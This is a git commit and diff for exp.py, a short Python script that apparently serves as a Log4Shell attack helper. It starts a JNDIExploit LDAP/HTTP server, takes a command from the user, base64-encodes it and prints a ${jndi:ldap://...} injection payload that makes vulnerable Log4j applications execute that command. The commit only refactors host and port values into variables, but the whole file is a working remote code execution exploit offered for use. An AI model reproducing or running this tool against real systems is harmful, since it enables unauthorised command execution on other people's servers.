f6d8a4bd6efc54d836babf43f979a5da2b509986
ZSD <36792635+JaneMandy@users.noreply.github.com>
2021-12-11 01:48:56 +0800

    Update exp.py

--- exp.py
+++ exp.py
@@ -1,13 +1,12 @@
 import subprocess,os,sys,base64
 Path="java"
-command=[Path,"-jar","JNDIExploit-1.2-SNAPSHOT.jar","--ip","127.0.0.1","-p","8000","-l","3380"]
+LDAP_Port="3380"
+HTTP_Port="8000"
+Host = "127.0.0.1"
+command=[Path,"-jar","JNDIExploit-1.2-SNAPSHOT.jar","--ip",Host,"-p",HTTP_Port,"-l",LDAP_Port]
 subp = os.system(" ".join(command)+" -u")
 
 print("Generate:${jndi:ldap:://127.0.0.1/} ")
 Command = base64.b64encode(raw_input("Input Command:"))
 print("Test Payload:${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/%s}"%Command)
 subp = os.system(" ".join(command))
-
-
-
-
